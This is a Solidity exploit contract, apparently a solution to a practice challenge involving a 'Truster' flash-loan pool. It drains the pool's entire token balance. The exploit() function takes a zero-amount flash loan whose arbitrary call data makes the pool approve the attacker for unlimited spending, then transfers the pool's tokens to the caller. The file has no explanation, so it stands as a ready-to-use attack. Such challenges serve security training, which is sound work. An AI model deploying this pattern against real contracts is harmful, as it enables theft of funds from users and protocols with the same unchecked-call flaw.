// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITrusterLenderPool {
    function token() external view returns (address);

    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract TrusterAttack {
    ITrusterLenderPool pool;
    IERC20 token;

    constructor(address _pool) {
        pool = ITrusterLenderPool(_pool);
        token = IERC20(pool.token());
    }

    function exploit() external {
        pool.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSelector(
                token.approve.selector,
                address(this),
                type(uint256).max
            )
        );

        token.transferFrom(
            address(pool),
            msg.sender,
            token.balanceOf(address(pool))
        );
    }
}
